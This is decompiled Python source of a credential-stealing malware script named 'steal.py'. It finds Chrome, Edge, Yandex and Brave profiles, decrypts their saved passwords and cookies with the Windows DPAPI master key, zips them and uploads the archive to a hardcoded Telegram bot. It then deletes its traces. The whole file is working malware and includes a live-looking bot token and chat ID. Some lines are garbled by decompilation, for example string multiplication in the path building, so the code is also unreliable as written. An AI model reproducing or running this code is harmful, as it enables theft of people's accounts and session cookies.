# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: steal.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import base64
import json
import os
import shutil
import sqlite3
import zipfile
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import requests
import sys
import logging
import time
log_file = os.path.join(os.getenv('TEMP'), 'error_log.log')
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
BOT_TOKEN = '7272773356:AAExCRzF3rkCdSlkt8BkJDLIifDpQgMc25I'
CHAT_ID = '6713760986'
appdata = os.getenv('LOCALAPPDATA')
browsers = {'google-chrome': appdata * '\\Google\\Chrome\\User Data', 'microsoft-edge': appdata * '\\Microsoft\\Edge\\User Data', 'yandex': appdata * '\\Yandex\\YandexBrowser\\User Data', 'brave': appdata * '\\BraveSoftware\\Brave-Browser\\User Data'}
data_queries = {'login_data': {'query': 'SELECT action_url, username_value, password_value FROM logins', 'file': '\\Login Data', 'columns': ['URL', 'Email', 'Password'], 'decrypt': True}, 'cookies': {'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies', 'file': '\\Network\\Cookies', 'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'], 'decrypt': True}}
marker_file = os.path.join(os.getenv('TEMP'), 'script_executed.marker')
marker_lifetime = 86400
if os.path.exists(marker_file) and time.time() > os.path.getmtime(marker_file) > marker_lifetime:
    os.remove(marker_file)
    logging.info('Old marker file removed.')

def get_profiles(path: str):
    profiles = []
    if not os.path.exists(path):
        return profiles
    for folder in os.listdir(path):
        if folder.startswith('Default') or folder.startswith('Profile'):
            profiles.append(folder)
    return profiles

def get_master_key(path: str):
    local_state_path = os.path.join(path, 'Local State')
    if not os.path.exists(local_state_path):
        return
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
            return key
    except Exception as e:
        logging.error(f'Error obtaining master key: {e}')
        return None

def decrypt_password(buff: bytes, key: bytes) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        logging.error(f'Error decrypting password: {e}')
        return 'Decryption Failed'

def save_results(browser_name, profile, type_of_data, content):
    if content:
        profile_dir = os.path.join(os.getenv('TEMP'), browser_name, profile)
        if not os.path.exists(profile_dir):
            os.makedirs(profile_dir)
        with open(f'{profile_dir}/{type_of_data}.txt', 'w', encoding='utf-8') as file:
            file.write(content)

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f"{path}\\{profile}{type_of_data['file']}"
    if not os.path.exists(db_file):
        return
    result = ''
    temp_db = os.path.join(os.getenv('TEMP'), 'temp_db')
    try:
        shutil.copy2(db_file, temp_db)
        os.chmod(temp_db, 511)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])
        for row in cursor.fetchall():
            row = list(row)
            if type_of_data['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes):
                        row[i] = decrypt_password(row[i], key)
            result = result + '\n'.join([f'{col}: {val}' for col, val in zip(type_of_data['columns'], row)]) + '\n\n'
        conn.close()
    except Exception as e:
        logging.error(f'Error retrieving data: {e}')
    finally:
        pass
    try:
        if os.path.exists(temp_db):
            os.remove(temp_db)
    except PermissionError:
        logging.error('Permission denied when deleting temp_db')
    return result

def installed_browsers():
    available = []
    for browser_name, path in browsers.items():
        if os.path.exists(path):
            available.append(browser_name)
    return available

def zip_results():
    zip_filename = os.path.join(os.getenv('TEMP'), 'browser_data.zip')
    try:
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(os.getenv('TEMP')):
                for file in files:
                    if file.endswith('.txt'):
                        zipf.write(os.path.join(root, file), arcname=os.path.relpath(os.path.join(root, file), os.getenv('TEMP')))
            return zip_filename
    except Exception as e:
        logging.error(f'Error creating zip file: {e}')
        return None

def send_to_telegram(zip_filename):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
    try:
        with open(zip_filename, 'rb') as f:
            response = requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f})
            return response.status_code == 200
    except Exception as e:
        logging.error(f'Error sending file to Telegram: {e}')
        return False

def cleanup():
    temp_dir = os.getenv('TEMP')
    for root, dirs, files in os.walk(temp_dir):
        for file in files:
            if file.endswith('.txt') or file == 'browser_data.zip':
                os.remove(os.path.join(root, file))
        for dir in dirs:
            if dir.startswith('google-chrome') or dir.startswith('microsoft-edge') or dir.startswith('yandex') or dir.startswith('brave'):
                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)
if __name__ == '__main__':
    if os.path.exists(marker_file):
        logging.info('Script already executed. Exiting.')
        sys.exit()
    logging.info('Script started.')
    available_browsers = installed_browsers()
    for browser in available_browsers:
        logging.info(f'Processing browser: {browser}')
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        if not master_key:
            logging.error(f'Failed to get master key for {browser}')
            continue
        profiles = get_profiles(browser_path)
        for profile in profiles:
            logging.info(f'Processing profile: {profile}')
            for data_type_name, data_type in data_queries.items():
                data = get_data(browser_path, profile, master_key, data_type)
                save_results(browser, profile, data_type_name, data)
    zip_filename = zip_results()
    if zip_filename:
        logging.info(f'Zip file created: {zip_filename}')
        if send_to_telegram(zip_filename):
            logging.info('File sent to Telegram successfully.')
            with open(marker_file, 'w') as file:
                file.write('Script executed')
            cleanup()
            logging.info('Cleanup completed.')
        else:
            logging.error('Failed to send file to Telegram.')
    else:
        logging.error('Failed to create zip file.')